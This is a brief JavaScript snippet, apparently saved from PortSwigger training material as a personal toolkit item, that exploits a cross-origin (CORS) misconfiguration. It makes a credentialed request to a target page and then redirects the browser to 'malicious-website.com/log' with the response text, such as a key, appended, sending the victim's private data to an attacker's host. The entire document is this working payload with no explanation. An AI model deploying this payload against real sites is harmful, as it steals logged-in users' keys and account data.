//credit portswigger. Saving here for my toolkit.
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://page',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//malicious-website.com/log?key='+this.responseText;
};
